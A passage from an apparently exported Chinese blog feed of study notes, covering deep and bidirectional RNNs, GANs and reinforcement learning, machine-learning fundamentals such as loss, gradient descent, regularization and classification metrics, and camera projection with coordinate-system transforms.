\boldsymbol{W}_{hh}^{(\ell)} + \boldsymbol{b}_h^{(\ell)}),其中权重$\boldsymbol{W}{xh}^{(\ell)} \in \mathbb{R}^{h \times h}$、$\boldsymbol{W}{hh}^{(\ell)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(\ell)} \in \mathbb{R}^{1 \times h}$分别为第$\ell$隐藏层的模型参数。 最终，输出层的输出只需基于第$L$隐藏层的隐藏状态： \boldsymbol{O}_t = \boldsymbol{H}_t^{(L)} \boldsymbol{W}_{hq} + \boldsymbol{b}_q,其中权重$\boldsymbol{W}_{hq} \in \mathbb{R}^{h \times q}$和偏差$\boldsymbol{b}_q \in \mathbb{R}^{1 \times q}$为输出层的模型参数。 同多层感知机一样，隐藏层个数$L$和隐藏单元个数$h$都是超参数。此外，如果将隐藏状态的计算换成门控循环单元或者长短期记忆的计算，我们可以得到深度门控循环神经网络。 双向循环神经网络之前介绍的循环神经网络模型都是假设当前时间步是由前面的较早时间步的序列决定的，因此它们都将信息通过隐藏状态从前往后传递。有时候，当前时间步也可能由后面时间步决定。例如，当我们写下一个句子时，可能会根据句子后面的词来修改句子前面的用词。双向循环神经网络通过增加从后往前传递信息的隐藏层来更灵活地处理这类信息。图21演示了一个含单隐藏层的双向循环神经网络的架构。 图21 双向循环神经网络的架构 生成模型在概率统计理论中, 生成模型是指能够随机生成观测数据的模型，尤其是在给定某些隐含参数的条件下。它给观测值和标注数据序列指定一个联合概率分布。在机器学习中，生成模型可以用来直接对数据建模（例如根据某个变量的概率密度函数进行数据采样），也可以用来建立变量间的条件概率分布。条件概率分布可以由生成模型根据贝叶斯定理形成。 香农 (1948) 给出了有一个英语双词频率表生成句子的例子。可以生成如“representing and speedily is an good”这种句子。一开始并不能生成正确的英文句子，但随着词频表由双词扩大为三词甚至多词，生成的句子也就慢慢的成型了。 生成模型的定义与判别模型相对应：生成模型是所有变量的全概率模型，而判别模型是在给定观测变量值前提下目标变量条件概率模型。因此生成模型能够用于模拟（即生成）模型中任意变量的分布情况，而判别模型只能根据观测变量得到目标变量的采样。判别模型不对观测变量的分布建模，因此它不能够表达观测变量与目标变量之间更复杂的关系。因此，生成模型更适用于无监督的任务，如分类和聚类。 生成对抗网络生成对抗网络（英语：Generative Adversarial Network，简称GAN）是非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出。[1] 生成对抗网络由一个生成网络与一个判别网络组成。生成网络从潜在空间（latent space）中随机采样作为输入，其输出结果需要尽量模仿训练集中的真实样本。判别网络的输入则为真实样本或生成网络的输出，其目的是将生成网络的输出从真实样本中尽可能分辨出来。而生成网络则要尽可能地欺骗判别网络。两个网络相互对抗、不断调整参数，最终目的是使判别网络无法判断生成网络的输出结果是否真实。[2][1][3] 生成对抗网络常用于生成以假乱真的图片。[4]此外，该方法还被用于生成视频[5]、三维物体模型[6]等。 强化学习强化学习（英语：Reinforcement learning，简称RL）是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、仿真优化、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。 在机器学习问题中，环境通常被规范为马可夫决策过程（MDP），所以许多强化学习算法在这种情况下使用动态规划技巧。传统的技术和强化学习算法的主要区别是，后者不需要关于MDP的知识，而且针对无法找到确切方法的大规模MDP。 强化学习和标准的监督式学习之间的区别在于，它并不需要出现正确的输入/输出对，也不需要精确校正次优化的行为。强化学习更加专注于在线规划，需要在探索（在未知的领域）和遵从（现有知识）之间找到平衡。强化学习中的“探索-遵从”的交换，在多臂老虎机（英语：multi-armed bandit）问题和有限MDP中研究得最多。 理解强化学习抛开强化学习探索反馈过程，从回合的最终结果看，强化学习也是一种有监督学习。回合最终结果的输赢就是标签，如果最终结果是好的，说明之前的一系列状态动作的决策过程是有效的，反之是无效的。通过不断地学习，最终可得到较优的状态到动作地策略分布Q函数或者状态和动作的值函数。 记忆网络传统的深度学习模型（RNN、LSTM、GRU等）使用hidden states或者Attention机制作为他们的记忆功能，但是这种方法产生的记忆太小了，无法精确记录一段话中所表达的全部内容，也就是在将输入编码成dense vectors的时候丢失了很多信息。记忆网络采用一种可读写的外部记忆模块，并将其和inference组件联合训练，最终得到一个可以被灵活操作的记忆模块。 参考链接 人工神经网络,by wikipedia. 神经网络简介,by google. 一文详解神经网络 BP 算法原理及 Python 实现,by AI研习社. 反向传播算法动态演示, by google. 深度学习架构家谱,by hunkim. 动手学深度学习,by d2l-zh. 神经网络之LeNet结构分析及参数详解,by Genius_zz. 经典CNN结构简析：AlexNet、VGG、NIN、GoogLeNet、ResNet etc. ,by Uno Whoiam. 一文读懂VGG网络,by Amusi. 生成模型,by wikipedia. 生成对抗网络,by wikipedia. GAN动态演示,by poloclub. 强化学习,by wikipedia. 25张图让你读懂神经网络架构, by Nicholas_Liu2017.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之相关概念]]></title>
    <url>%2F2018%2F11%2F19%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[机器学习是人工智能的一个分支。人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。显然，机器学习是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。 定义机器学习有下面几种定义： 机器学习是一门人工智能的科学，该领域的主要研究对象是人工智能，特别是如何在经验学习中改善具体算法的性能。 机器学习是对能通过经验自动改进的计算机算法的研究。 机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。 一种经常引用的英文定义是：A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E. 分类机器学习可以分成下面几种类别： 监督学习：从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。 监督学习和非监督学习的差别就是训练集目标是否人标注。他们都有训练集且都有输入和输出。 无监督学习：与监督学习相比，训练集没有人为标注的结果。常见的无监督学习算法有生成对抗网络（GAN）、聚类。 半监督学习：介于监督学习与无监督学习之间。 强化学习：通过观察来学习做成如何的动作。每个动作都会对环境有所影响，学习对象根据观察到的周围环境的反馈来做出判断。 算法具体的机器学习算法有： 构造间隔理论分布：聚类分析和模式识别 人工神经网络 决策树 感知器 支持向量机 集成学习AdaBoost 降维与度量学习 聚类 贝叶斯分类器 构造条件概率：回归分析和统计分类 高斯过程回归 线性判别分析 最近邻居法 径向基函数核 通过再生模型构造概率密度函数： 最大期望算法 概率图模型：包括贝叶斯网和Markov随机场 Generative Topographic Mapping 近似推断技术： 马尔可夫链 蒙特卡罗方法 变分法 最优化：大多数以上方法，直接或者间接使用最优化算法。 机器学习基础标签标签是我们要预测的事物，即简单线性回归中的 y 变量。标签可以是小麦未来的价格、图片中显示的动物品种、音频剪辑的含义或任何事物。 特征特征是输入变量，即简单线性回归中的 x 变量。简单的机器学习项目可能会使用单个特征，而比较复杂的机器学习项目可能会使用数百万个特征，按如下方式指定： \{ x_1,x_2,...x_N \}在垃圾邮件检测器示例中，特征可能包括： 电子邮件文本中的字词 发件人的地址 发送电子邮件的时段 电子邮件中包含“一种奇怪的把戏”这样的短语。 样本样本是指数据的特定实例：x。（我们采用粗体 x 表示它是一个矢量。）我们将样本分为以下两类： 有标签样本 无标签样本 有标签样本同时包含特征和标签，常用于训练模型。。即：1labeled examples: &#123;features, label&#125;: (x, y) 无标签样本包含特征，但不包含标签，常用于模型预测。即：1unlabeled examples: &#123;features, ?&#125;: (x, ?) 模型模型定义了特征与标签之间的关系。例如，垃圾邮件检测模型可能会将某些特征与“垃圾邮件”紧密联系起来。我们来重点介绍一下模型生命周期的两个阶段： 训练表示创建或学习模型。向模型展示有标签样本，让模型逐渐学习特征与标签之间的关系。 推断表示将训练后的模型应用于无标签样本。使用训练后的模型来做出有用的预测 (y’)。 回归与分类回归模型可预测连续值。例如，回归模型做出的预测可回答如下问题： 加利福尼亚州一栋房产的价值是多少？ 用户点击此广告的概率是多少？ 分类模型可预测离散值。例如，分类模型做出的预测可回答如下问题： 某个指定电子邮件是垃圾邮件还是非垃圾邮件？ 这是一张狗、猫还是仓鼠图片？ 损失训练模型表示通过有标签样本来学习（确定）所有权重和偏差的理想值。在监督式学习中，机器学习算法通过以下方式构建模型：检查多个样本并尝试找出可最大限度地减少损失的模型；这一过程称为经验风险最小化。 损失是对糟糕预测的惩罚。也就是说，损失是一个数值，表示对于单个样本而言模型预测的准确程度。如果模型的预测完全准确，则损失为零，否则损失会较大。训练模型的目标是从所有样本中找到一组平均损失“较小”的权重和偏差。 平方损失：又称为 $L_2$ 损失,一种常见的损失函数。例如单个样本的平方损失如下：123= the square of the difference between the label and the prediction= (observation - prediction(x))^2= (y - y&apos;)^2 均方误差 (MSE) 指的是每个样本的平均平方损失。要计算 MSE，请求出各个样本的所有平方损失之和，然后除以样本数量： MSE = \frac{1}{N} \sum_{(x,y)\in D} (y - prediction(x))^2其中： (x,y)指的是样本，其中 x指的是模型进行预测时使用的特征集（例如，温度、年龄和交配成功率）。 y指的是样本的标签（例如，每分钟的鸣叫次数）。 prediction(x)指的是权重和偏差与特征集 x 结合的函数。 D指的是包含多个有标签样本（即 (x,y)）的数据集。 N指的是D中的样本数量。 迭代方法下图显示了机器学习算法用于训练模型的迭代试错过程： 图1 用于训练模型的迭代方法 梯度下降法计算参数更新的目标是在模型的迭代试错过程中，使损失越来越小。而常用的方法就是梯度下降法。 图2 回归问题产生的损失与权重图为凸形 对于图2所示的凸形问题，刚好存在一个斜率正好为 0 的位置，即是损失函数的收敛之处。梯度下降法的第一个阶段是为$w_1$ 选择一个起始值（起点）。 然后，梯度下降法算法会计算损失曲线在起点处的梯度。简而言之，梯度是偏导数的矢量；它可以让您了解哪个方向距离目标“更近”或“更远”。 请注意，梯度是一个矢量，因此具有以下两个特征： 方向 大小 梯度始终指向损失函数中增长最为迅猛的方向。梯度下降法算法会沿着负梯度的方向走一步，以便尽快降低损失。 为了确定损失函数曲线上的下一个点，梯度下降法算法会将梯度大小的一部分与起点相加，如图3所示： 图3 一个梯度步长将我们移动到损失曲线上的下一个点 然后，梯度下降法会重复此过程，逐渐接近最低点。 学习速率梯度下降法算法用梯度乘以一个称为学习速率（有时也称为步长）的标量，以确定下一个点的位置。例如，如果梯度大小为 2.5，学习速率为 0.01，则梯度下降法算法会选择距离前一个点 0.025 的位置作为下一个点。 超参数是编程人员在机器学习算法中用于调整的旋钮。大多数机器学习编程人员会花费相当多的时间来调整学习速率。如果您选择的学习速率过小，就会花费太长的学习时间。如果您指定的学习速率过大，下一个点将永远在 U 形曲线的底部随意弹跳。 随机梯度下降法在梯度下降法中，批量指的是用于在单次迭代中计算梯度的样本总数。到目前为止，我们一直假定批量是指整个数据集。就 Google 的规模而言，数据集通常包含数十亿甚至数千亿个样本。此外，Google 数据集通常包含海量特征。因此，一个批量可能相当巨大。如果是超大批量，则单次迭代就可能要花费很长时间进行计算。 通过从我们的数据集中随机选择样本，我们可以通过小得多的数据集估算（尽管过程非常杂乱）出较大的平均值。 随机梯度下降法 (SGD) 将这种想法运用到极致，它每次迭代只使用一个样本（批量大小为 1）。如果进行足够的迭代，SGD 也可以发挥作用，但过程会非常杂乱。“随机”这一术语表示构成各个批量的一个样本都是随机选择的。 小批量随机梯度下降法（小批量 SGD）是介于全批量迭代与 SGD 之间的折衷方案。小批量通常包含 10-1000 个随机选择的样本。小批量 SGD 可以减少 SGD 中的杂乱样本数量，但仍然比全批量更高效。 泛化(Generalization)泛化是指机器学习对从真实概率分布（已隐藏）中抽取的新数据做出良好预测的能力。要取得良好的泛化能力，机器学习必须满足以下基本假设，同时防止过拟合。 机器学习的基本假设： 从分布中随机抽取独立同分布 (i.i.d) 的样本。换言之，样本之间不会互相影响。（另一种解释：i.i.d. 是表示变量随机性的一种方式）。 分布是平稳的；即分布在数据集内不会发生变化。 从同一分布的数据划分中抽取样本。 过拟合模型在训练过程中产生的损失很低，但在预测新数据方面的表现却非常糟糕。 训练集与测试集机器学习模型旨在根据以前未见过的新数据做出良好预测。但是，如果您要根据数据集构建模型，如何获得以前未见过的数据呢？一种方法是将您的数据集分成两个子集： 训练集 - 用于训练模型的子集。 测试集 - 用于测试模型的子集。 测试集应满足以下两个条件： 规模足够大，可产生具有统计意义的结果。 能代表整个数据集。换言之，挑选的测试集的特征应该与训练集的特征相同。 验证集将数据集划分为训练集和测试集两个子集是个不错的想法，但不是万能良方。通过将数据集划分为训练集、验证集、测试集三个子集，可以大幅降低过拟合的发生几率。 使用验证集评估训练集的效果。然后，在模型“通过”验证集之后，使用测试集再次检查评估结果。图4展示了这一新工作流程： 图4 使用验证集的工作流程 特征表示特征工程指的是将原始数据转换为特征矢量。进行特征工程预计需要大量时间。 映射数值: 机器学习模型根据浮点值进行训练，因此整数和浮点原始数据不需要特殊编码。 映射字符串值: 首先为要表示的所有特征的字符串值定义一个词汇表。然后使用该词汇表创建一个独热编码，用于将指定字符串值表示为二元矢量。 映射分类（枚举）值 图5 通过独热编码映射字符串值 良好特征的特点 避免很少使用的离散特征值。 良好的特征值应该在数据集中出现大约 5 次以上。这样一来，模型就可以学习该特征值与标签是如何关联的。 最好具有清晰明确的含义。 每个特征对于项目中的任何人来说都应该具有清晰明确的含义。例如，下面的房龄适合作为特征，可立即识别为年龄：1house_age: 27 不要将“神奇”的值与实际数据混为一谈 良好的浮点特征不包含超出范围的异常断点或“神奇”的值。例如，假设一个特征具有 0 到 1 之间的浮点值。那么，如下值是可以接受的：12quality_rating: 0.82quality_rating: 0.37 不过，如果用户没有输入 quality_rating，则数据集可能使用如下神奇值来表示不存在该值：1quality_rating: -1 为解决神奇值的问题，需将该特征转换为两个特征：123一个特征只存储质量评分，不含神奇值。一个特征存储布尔值，表示是否提供了 quality_rating。为该布尔值特征指定一个名称，例如 is_quality_rating_defined。 考虑上游不稳定性 特征的定义不应随时间发生变化。例如，下列值是有用的，因为城市名称一般不会改变。（注意，我们仍然需要将“br/sao_paulo”这样的字符串转换为独热矢量。）1city_id: &quot;br/sao_paulo&quot; 但收集由其他模型推理的值会产生额外成本。可能值“219”目前代表圣保罗，但这种表示在未来运行其他模型时可能轻易发生变化：1inferred_city_cluster: &quot;219&quot; 清理数据即使是非常少量的坏样本会破坏掉一个大规模数据集，因此需花费大量的时间挑出坏样本并加工可以挽救的样本。 缩放特征值: 缩放是指将浮点特征值从自然范围（例如 100 到 900）转换为标准范围（例如 0 到 1 或 -1 到 +1）。如果特征集包含多个特征，则缩放特征可以带来以下优势： 帮助梯度下降法更快速地收敛。 帮助避免“NaN 陷阱”。 帮助模型为每个特征确定合适的权重。 处理极端离群值 对每个值取对数 将最大值“限制”为某个任意值 分箱 清查 数据集中的很多样本是不可靠的，原因有以下一种或多种： 遗漏值。 例如，有人忘记为某个房屋的年龄输入值。 重复样本。 例如，服务器错误地将同一条记录上传了两次。 不良标签。 例如，有人错误地将一颗橡树的图片标记为枫树。 不良特征值。 例如，有人输入了多余的位数，或者温度计被遗落在太阳底下。 正则化图6泛化曲线显示的是训练集和验证集相对于训练迭代次数的损失。 图6 训练集和验证集损失 图6显示的是某个模型的训练损失逐渐减少，但验证损失最终增加。换言之，该泛化曲线显示该模型与训练集中的数据过拟合。根据奥卡姆剃刀定律，或许我们可以通过降低复杂模型的复杂度来防止过拟合，这种原则称为正则化。 正则化以最小化损失和复杂度为目标，这称为结构风险最小化： \text{minimize(Loss(Data|Model) + complexity(Model))}现在，训练优化算法是一个由两项内容组成的函数：一个是损失项，用于衡量模型与数据的拟合度，另一个是正则化项，用于衡量模型复杂度。 有两种常用衡量模型复杂度的方法： 将模型复杂度作为模型中所有特征的权重的函数。 将模型复杂度作为具有非零权重的特征总数的函数。 如果模型复杂度是权重的函数，则特征权重的绝对值越高，对模型复杂度的贡献就越大。 L2正则化可以使用 L2 正则化公式来量化复杂度，该公式将正则化项定义为所有特征权重的平方和： L_2\text{ regularization term} = ||\boldsymbol w||_2^2 = {w_1^2 + w_2^2 + ... + w_n^2}在这个公式中，接近于 0 的权重对模型复杂度几乎没有影响，而离群值权重则可能会产生巨大的影响。 模型开发者通过以下方式来调整正则化项的整体影响：用正则化项的值乘以名为 lambda（又称为正则化率）的标量。也就是说，模型开发者会执行以下运算： \text{minimize(Loss(Data|Model)} + \lambda \text{ complexity(Model))}执行 L2 正则化对模型具有以下影响: 使权重值接近于 0（但并非正好为 0） 使权重的平均值接近于 0，且呈正态（钟形曲线或高斯曲线）分布。 在选择 lambda 值时，目标是在简单化和训练数据拟合之间达到适当的平衡： 如果您的 lambda 值过高，则模型会非常简单，但是您将面临数据欠拟合的风险。您的模型将无法从训练数据中获得足够的信息来做出有用的预测。 如果您的 lambda 值过低，则模型会比较复杂，并且您将面临数据过拟合的风险。您的模型将因获得过多训练数据特点方面的信息而无法泛化到新数据。 L1正则化稀疏矢量通常包含许多维度。创建特征组合会导致包含更多维度。由于使用此类高维度特征矢量，因此模型可能会非常庞大，并且需要大量的 RAM。 在高维度稀疏矢量中，最好尽可能使权重正好降至 0。正好为 0 的权重基本上会使相应特征从模型中移除。 将特征设为 0 可节省 RAM 空间，且可以减少模型中的噪点。 L1 正则化使模型中很多信息缺乏的系数正好为 0，从而在推理时节省 RAM，同时具有凸优化的优势，可有效进行计算。 L2 和 L1 采用不同的方式降低权重： L2 会降低权重2。 L1 会降低 |权重|。 因此，L2 和 L1 具有不同的导数： L2 的导数为 2 * 权重。 L1 的导数为 k（一个常数，其值与权重无关）。 逻辑回归许多问题需要将概率估算值作为输出。逻辑回归是一种极其高效的概率计算机制。实际上，您可以通过下两种方式之一使用返回的概率： “按原样” 转换成二元类别。 在很多情况下，您会将逻辑回归输出映射到二元分类问题的解决方案，该二元分类问题的目标是正确预测两个可能的标签（例如，“垃圾邮件”或“非垃圾邮件”）中的一个。 您可能想知道逻辑回归模型如何确保输出值始终落在 0 和 1 之间。巧合的是，S 型函数生成的输出值正好具有这些特性，其定义如下： y = \frac{1}{1 + e^{-z}}S 型函数会产生以下曲线图： 图7 S 型函数 如果 z 表示使用逻辑回归训练的模型的线性层的输出，则 S 型(z) 函数会生成一个介于 0 和 1 之间的值（概率）。用数学方法表示为： y' = \frac{1}{1 + e^{-(z)}}其中： y’ 是逻辑回归模型针对特定样本的输出。 z 是 b + w1x1 + w2x2 + … wNxN “w”值是该模型学习的权重和偏差。 “x”值是特定样本的特征值。 请注意，z 也称为对数几率，因为 S 型函数的反函数表明，z 可定义为标签“1”（例如“狗叫”）的概率除以标签“0”（例如“狗不叫”）的概率得出的值的对数： z = log(\frac{y}{1-y})逻辑回归模型训练线性回归的损失函数是平方损失。逻辑回归的损失函数是对数损失函数，定义如下： Log Loss = \sum_{(x,y)\in D} -ylog(y') - (1 - y)log(1 - y')其中： (xy)ϵD 是包含很多有标签样本 (x,y) 的数据集。 “y”是有标签样本中的标签。由于这是逻辑回归，因此“y”的每个值必须是 0 或 1。 “y’”是对于特征集“x”的预测值（介于 0 和 1 之间）。 对数损失函数的方程式与 Shannon 信息论中的熵测量密切相关。它也是似然函数的负对数（假设“y”属于伯努利分布）。实际上，最大限度地降低损失函数的值会生成最大的似然估计值。 正则化在逻辑回归建模中极其重要。如果没有正则化，逻辑回归的渐近性会不断促使损失在高维度空间内达到 0。因此，大多数逻辑回归模型会使用以下两个策略之一来降低模型复杂性： L2 正则化。 早停法，即，限制训练步数或学习速率。 分类指定阈值为了将逻辑回归值映射到二元类别，您必须指定分类阈值（也称为判定阈值）。如果值高于该阈值，则表示“垃圾邮件”；如果值低于该阈值，则表示“非垃圾邮件”。人们往往会认为分类阈值应始终为 0.5，但阈值取决于具体问题，因此您必须对其进行调整。 真与假以及正类别与负类别 真正例是指模型将正类别样本正确地预测为正类别。 真负例是指模型将负类别样本正确地预测为负类别。 假正例是指模型将负类别样本错误地预测为正类别 假负例是指模型将正类别样本错误地预测为负类别。 准确率准确率是一个用于评估分类模型的指标。通俗来说，准确率是指我们的模型预测正确的结果所占的比例。正式点说，准确率的定义如下： \text{Accuracy} = \frac{\text{Number of correct predictions}}{\text{Total number of predictions}}对于二元分类，也可以根据正类别和负类别按如下方式计算准确率： \text{Accuracy} = \frac{TP+TN}{TP+TN+FP+FN}其中，TP = 真正例，TN = 真负例，FP = 假正例，FN = 假负例。 精确率和召回率当使用分类不平衡的数据集（比如正类别标签和负类别标签的数量之间存在明显差异）时，单单准确率一项并不能反映全面情况。这时需要能够更好地评估分类不平衡问题的指标：精确率和召回率。 精确率的定义如下： \text{Precision} = \frac{TP}{TP+FP}从数学上讲，召回率的定义如下： \text{Recall} = \frac{TP}{TP+FN}要全面评估模型的有效性，必须同时检查精确率和召回率。遗憾的是，精确率和召回率往往是此消彼长的情况。 ROC 和曲线下面积ROC 曲线（接收者操作特征曲线）是一种显示分类模型在所有分类阈值下的效果的图表。该曲线绘制了以下两个参数： 真正例率 假正例率 真正例率 (TPR) 是召回率的同义词，因此定义如下： TPR = \frac{TP} {TP + FN}假正例率 (FPR) 的定义如下： FPR = \frac{FP} {FP + TN}ROC 曲线用于绘制采用不同分类阈值时的 TPR 与 FPR。降低分类阈值会导致将更多样本归为正类别，从而增加假正例和真正例的个数。下图显示了一个典型的 ROC 曲线。 图8 不同分类阈值下的 TP 率与 FP 率 曲线下面积表示“ROC 曲线下面积”。也就是说，曲线下面积测量的是从 (0,0) 到 (1,1) 之间整个 ROC 曲线以下的整个二维面积（参考积分学）。 图9 曲线下面积（ROC 曲线下面积） 曲线下面积对所有可能的分类阈值的效果进行综合衡量。曲线下面积的一种解读方式是看作模型将某个随机正类别样本排列在某个随机负类别样本之上的概率。 曲线下面积的取值范围为 0-1。预测结果 100% 错误的模型的曲线下面积为 0.0；而预测结果 100% 正确的模型的曲线下面积为 1.0。 曲线下面积因以下两个原因而比较实用： 曲线下面积的尺度不变。它测量预测的排名情况，而不是测量其绝对值。 曲线下面积的分类阈值不变。它测量模型预测的质量，而不考虑所选的分类阈值。 不过，这两个原因都有各自的局限性，这可能会导致曲线下面积在某些用例中不太实用： 并非总是希望尺度不变。 例如，有时我们非常需要被良好校准的概率输出，而曲线下面积无法告诉我们这一结果。 并非总是希望分类阈值不变。 在假负例与假正例的代价存在较大差异的情况下，尽量减少一种类型的分类错误可能至关重要。例如，在进行垃圾邮件检测时，您可能希望优先考虑尽量减少假正例（即使这会导致假负例大幅增加）。对于此类优化，曲线下面积并非一个实用的指标。 预测偏差逻辑回归预测应当无偏差。即: \text{预测平均值}\approx\text{观察平均值}预测偏差指的是这两个平均值之间的差值。即： \text{预测偏差} = \text{预测平均值} - \text{数据集中相应标签的平均值}造成预测偏差的可能原因包括： 特征集不完整 数据集混乱 模型实现流水线中有错误？ 训练样本有偏差 正则化过强 端到端（end to end）传统机器学习算法在应用过程中需要经历特征工程这一步骤，从研究对象中提取特征信息，便于后续的训练和测试。在传统机器学习中，特征工程非常重要，它提取特征的好坏关系到机器学习的最终效果。 本质上，特征工程是将研究对象信息降维的过程。而深度学习则无需这一手工提取特征的过程。以深度学习在图像分类中的应用为例，它直接输入高维的原始图像，输出即是图像分类。这个过程即叫做端到端。 参考链接 机器学习，by wikipedia. 机器学习速成课程，by google. MathJax使用LaTeX语法编写数学公式教程 什么是 end-to-end 神经网络？,by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机视觉之相机成像原理与坐标系转换]]></title>
    <url>%2F2018%2F11%2F19%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E4%B9%8B%E7%9B%B8%E6%9C%BA%E6%88%90%E5%83%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%9D%90%E6%A0%87%E7%B3%BB%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[计算机视觉是一门研究用摄影机和计算机代替人眼对目标进行识别、跟踪和测量的学科。为了解该门学科，首先应掌握投影原理和世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换关系。 三维投影计算机3D图形学中，三维投影是将三维空间中的点映射到二维平面上的方法。常用三维投影有正交投影和透视投影。正交投影通常用于对现实物品的三维建模，而透视投影与人的视觉系统类似，常用于在二维平面呈现三维世界。 正交投影原理正交投影是一系列用于显示三维物体的轮廓、细节或精确测量结果的变换方法。通常又称作截面图、鸟瞰图或立面图。 当视平面的法向（即摄像机的朝向）平行于笛卡尔坐标系三根坐标轴中的一根，数学变换定义如下： 若使用一个平行于y轴（侧视图）的正交投影将三维点 $a{x}$, $a{y}$,$a{z}$投影到二维平面上得到二维点 $b{x}$,$b_{y}$，可以使用如下公式 b_x=s_xa_x+c_xb_y=s_za_z+c_z其中向量s是一个任意的缩放因子，而c是一个任意的偏移量。这些常量可自由选择，通常用于将视口调整到一个合适的位置。该投影变换同样可以使用矩阵表示（为清晰起见引入临时向量d） \begin{bmatrix} d_x \\ d_y \\ \end{bmatrix} = \begin{bmatrix} 1 & 0 & 0 \\ 0 & 0 & 1 \\ \end{bmatrix} \begin{bmatrix} a_x \\ a_y \\ a_z \\ \end{bmatrix} \begin{bmatrix} b_x\\ b_y\\ \end{bmatrix} = \begin{bmatrix} s_x & 0 \\ 0 & s_z \\ \end{bmatrix} \begin{bmatrix} d_x\\ d_y\\ \end{bmatrix} + \begin{bmatrix} c_x\\ c_z\\ \end{bmatrix}虽然正交投影产生的图像在一定程度上反映了物体的三维特性，但此类投影图像和实际观测到的并不相同。特别是对于相同长度的平行线段，无论离虚拟观察者（摄像机）远近与否，它们都会在正交投影中显示为相同长度。这会导致较近的线段看起来被缩短了。 透视投影原理透视投影是为了获得接近真实三维物体的视觉效果而在二维的纸或者画布平面上绘图或者渲染的一种方法，它也称为透视图。透视投影的绘制必须根据已有的几何规则进行。 常用的透视投影视椎体模型如图1所示。设视点E位于原点，视平面P垂直于Z轴，且四边分别平行于x轴和y轴，视椎体的近截面离视点的距离为n，远截面离视点的距离为f，且一般取近截面为视平面。 图1 透视投影的标准视椎体模型 坐标系之间的转换计算机视觉通常涉及到四个坐标系：像素平面坐标系（u,v）、像平面坐标系（图像物理坐标第（x,y）、相机坐标系（Xc,Yc,Zc）和世界坐标系（Xw,Yw,Zw），如图2所示。 图2 四个坐标系 1 : 世界坐标系：根据情况而定，可以表示任何物体。单位m。 2：相机坐标系：以摄像机光心为原点（在针孔模型中也就是针孔为光心），z轴与光轴重合也就是z轴指向相机的前方（也就是与成像平面垂直），x轴与y轴的正方向与物体坐标系平行，其中上图中的f为摄像机的焦距。单位m 3：图像物理坐标系（也叫平面坐标系）：用物理单位表示像素的位置，坐标原点为摄像机光轴与图像物理坐标系的交点位置。坐标系为图上o-xy。单位是mm。单位毫米的原因是此时由于相机内部的CCD传感器是很小的，比如8mm x 6mm。但是最后图像照片是也像素为单位比如640x480.这就涉及到了图像物理坐标系与像素坐标系的变换了。下面的像素坐标系将会讲到。 4：像素坐标系：以像素为单位，坐标原点在左上角。这也是一些opencv，OpenGL等库的坐标原点选在左上角的原因。当然明显看出CCD传感器以mm单位到像素中间有转换的。举个例子，CCD传感上上面的8mm x 6mm，转换到像素大小是640x480. 假如dx表示像素坐标系中每个像素的物理大小就是1/80. 也就是说毫米与像素点的之间关系是piexl/mm. 世界坐标系到相机坐标系的转换物体之间的坐标系变换都可以表示坐标系的旋转变换加上平移变换，则世界坐标系到相机坐标系的转换关系也是如此，他们之间的变换如图3所示。 图3 世界坐标系到相机坐标系的转换 可以得到P点在相机坐标系下的坐标: \begin{bmatrix} X_c\\ Y_c\\ Z_c\\ \end{bmatrix} = R \begin{bmatrix} X_w\\ Y_w\\ Z_w\\ \end{bmatrix} +T \Rightarrow \begin{bmatrix} X_c\\ Y_c\\ Z_c\\ 1\\ \end{bmatrix} = \begin{bmatrix} R & T\\ \vec{0} & 1\\ \end{bmatrix} \begin{bmatrix} X_w\\ Y_w\\ Z_w\\ 1\\ \end{bmatrix} , R:3*3,T:3*1相机坐标系到图像物理坐标系的转换从相机坐标系到图像坐标系，属于透视投影关系，从3D转换到2D。 也可以看成是针孔模型的变种。该转换满足三角形的相似定理，如图4所示。 图4 相机坐标系到图像物理坐标系的转换 图像物理坐标系到像素坐标系的转换图像物理坐标系到像素坐标系的转换不涉及旋转变换，但是坐标原点位置不一致，大小不一致，涉及伸缩变换及平移变换，如图5所示。 图5 图像物理坐标系到像素坐标系的转换 小结四个坐标系之间存在着下述关系 ( 矩阵依次左乘 )，如图6所示: 图6 世界坐标系到像素坐标系的转换 其中相机的内参和外参可以通过张正友标定获取。通过最终的转换关系来看，一个三维中的坐标点，的确可以在图像中找到一个对应的像素点，但是反过来，通过图像中的一个点找到它在三维中对应的点就很成了一个问题，因为我们并不知道等式左边的Zc的值。 参考链接 三维投影,by wikipedia. 透视投影的原理和实现,by Goncely. 计算机视觉：相机成像原理：世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换,by 生活没有if-else 